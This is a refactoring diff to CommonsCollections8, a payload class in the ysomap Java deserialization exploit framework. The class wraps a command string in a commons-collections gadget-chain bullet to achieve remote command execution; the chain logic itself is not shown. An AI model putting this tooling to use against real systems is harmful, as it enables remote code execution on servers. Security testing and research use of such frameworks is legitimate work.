@@ -4,12 +4,12 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
-import ysomap.exception.GenerateErrorException;
-import ysomap.gadget.ObjectGadget;
-import ysomap.gadget.bullet.collections.TransformerBullet;
-import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
+import ysomap.annotation.Require;
+import ysomap.gadget.ObjectGadget;
+import ysomap.gadget.bullet.Bullet;
+import ysomap.gadget.bullet.collections.TransformerBullet;
 import ysomap.gadget.payload.Payload;
 import ysomap.serializer.Serializer;
 import ysomap.serializer.SerializerFactory;
@@ -26,6 +26,7 @@ import java.util.Map;
  */
 @SuppressWarnings({"rawtypes","unchecked"})
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
+@Require(bullets = {"TransformerBullet","TransformerWithTemplatesImplBullet","TransformerWithResponseBullet"})
 @Authors({ Authors.WH1T3P1G })
 public class CommonsCollections8 extends Payload<Hashtable> {
 
@@ -69,11 +70,10 @@ public class CommonsCollections8 extends Payload<Hashtable> {
     }
 
     @Override
-    public ObjectGadget getDefaultBullet(String command) {
-        return new TransformerBullet(command, "3");
-    }
-
-    public static void main(String[] args) throws GenerateErrorException {
-        new PayloadTester(CommonsCollections8.class).run();
+    public ObjectGadget getDefaultBullet(String command) throws Exception {
+        Bullet bullet = new TransformerBullet();
+        bullet.set("args", command);
+        bullet.set("version", "3");
+        return bullet;
     }
 }
